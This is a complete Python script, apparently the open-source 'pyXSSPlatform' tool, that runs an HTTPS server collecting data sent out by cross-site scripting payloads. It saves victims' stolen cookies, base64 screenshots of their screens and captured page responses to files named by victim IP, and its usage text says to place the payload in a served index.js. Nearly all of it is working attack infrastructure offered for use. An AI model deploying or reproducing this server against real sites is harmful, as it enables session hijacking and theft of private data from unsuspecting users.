#Python3 
from http.server import SimpleHTTPRequestHandler
from http import server
import ssl
import base64 
import urllib.parse
import time
import sys
class RequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        f = self.send_head()
        if f:
            self.copyfile(f, self.wfile)
            f.close()
        print(self.headers["User-Agent"])

        if "/cookie" in self.path:
            localtime = time.strftime("%Y%m%d-%H%M%S", time.localtime())           
            savePath = self.client_address[0] + "-Cookie-" + str(localtime) + ".txt"
            print("[+] New Cookie: ")
            print("    Save as: " + savePath)
            cookieData = urllib.parse.unquote(self.path[15:])
            file = open(savePath,'wb')
            file.write(cookieData.encode())
            file.close()

    def do_POST(self):
        data = "Success"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(data.encode("utf-8"))
        req_datas = self.rfile.read(int(self.headers["content-length"]))
        print(self.headers["User-Agent"])

        if self.path == "/screen":
            localtime = time.strftime("%Y%m%d-%H%M%S", time.localtime())           
            savePath = self.client_address[0] + "-CaptureScreen-" + str(localtime) + ".png"
            print("[+] New CaptureScreen: ")
            print("    Save as: " + savePath)
            base64str = urllib.parse.unquote(req_datas.decode())
            base64str = base64str[33:]
            imgData = base64.b64decode(base64str)
            file = open(savePath,'wb')
            file.write(imgData)
            file.close()

        elif self.path == "/data":
            localtime = time.strftime("%Y%m%d-%H%M%S", time.localtime())           
            savePath = self.client_address[0] + "-XMLHttpRequest-" + str(localtime) + ".html"

            httpData = urllib.parse.unquote(req_datas.decode())
            index = httpData.index(';data=')
            targetURL = httpData[9:index]
            responseData = httpData[index+6:]
            print("[+] New XMLHttpRequest")
            print("    TargetURL: " + targetURL)
            print("    Save as: " + savePath)

            file = open(savePath,'wb')
            file.write(responseData.encode())
            file.close()

        else:
            print(req_datas.decode())
        

if __name__ == '__main__':
    if len(sys.argv)!=4: 
        print('pyXSSPlatform')       
        print('Use to build an XSS Platform.')
        print('Author:3gstudent')      
        print('Usage:')
        print('%s <listen address> <listen port> <cert file>'%(sys.argv[0]))
        print('You can use openssl to generate the cert file:')
        print('openssl req -new -x509 -keyout https_svr_key.pem -out https_svr_key.pem -days 3650 -nodes')
        print('Payload:')
        print('- GetCookie')
        print('- CaptureScreen')
        print('- GET/POST')
        print('Eg.')
        print('%s 0.0.0.0 443 https_svr_key.pem'%(sys.argv[0]))
        sys.exit(0)
    else:
        address = sys.argv[1]
        port = int(sys.argv[2])
        certfile = sys.argv[3]

        httpd =server.HTTPServer((address, port),RequestHandler)
        httpd.socket = ssl.wrap_socket(httpd.socket, certfile=certfile, server_side=True)

        print("[*] HTTPS Server listening on %s:%d"%(address, port))
        print("[*] XSS url: https://%s/index.js"%(address))
        print('    You should add the payload into the index.js')
        httpd.serve_forever()


